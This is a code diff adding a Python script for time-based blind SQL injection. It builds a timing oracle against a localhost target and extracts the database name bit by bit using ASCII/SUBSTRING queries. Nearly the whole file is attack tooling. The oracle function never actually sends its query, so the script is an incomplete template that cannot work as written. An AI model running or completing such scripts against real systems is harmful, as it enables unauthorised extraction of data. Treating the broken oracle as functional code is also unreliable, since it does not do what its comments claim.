@@ -1,0 +1,57 @@
+import requests
+import time
+import requests
+import json
+import sys
+from urllib.parse import quote_plus
+
+
+# Define the length of time (in seconds) the server should
+# wait if `q` is `true`
+DELAY = 2
+TARGET = "https://localhost/"
+
+# Evalutes `q` on the server side and returns `true` or `false`
+def oracle(q):
+    start = time.time()
+    r = requests.get(
+        TARGET,
+        headers = {}
+    )
+    return time.time() - start > DELAY
+
+# Verify that the oracle works by checking if the correct
+# values are returned for queries `1=1` and `1=0`
+print("[*] Starting Oracle")
+assert oracle("1=1")
+assert not oracle("1=0")
+print("[*] Oracle verified")
+
+
+def dumpNumber(substatement):
+    print(f"[*] Guessing Length of {substatement}:")
+    length = 0
+    for p in range(7):
+        if oracle(f"({substatement})&{2**p}>0"):
+            length |= 2**p
+    print(f"[*] Length = {length}")
+    return length
+
+
+def dumpString(substatement, length):
+    print(f"[*] Guessing Name of {substatement}:")
+    val = ""
+    for i in range(1, length + 1):
+        c = 0
+        for p in range(7):
+            if oracle(f"ASCII(SUBSTRING(({substatement}),{i},1))&{2**p}>0"):
+                c |= 2**p
+        val += chr(c)
+    print(f"[*] Name = {val}")
+    return val
+
+# Example usage:
+print("\n== Guessing Name of Database ==")
+db_name_length = dumpNumber("LEN(DB_NAME())")
+db_name = dumpString("DB_NAME()", db_name_length)
+
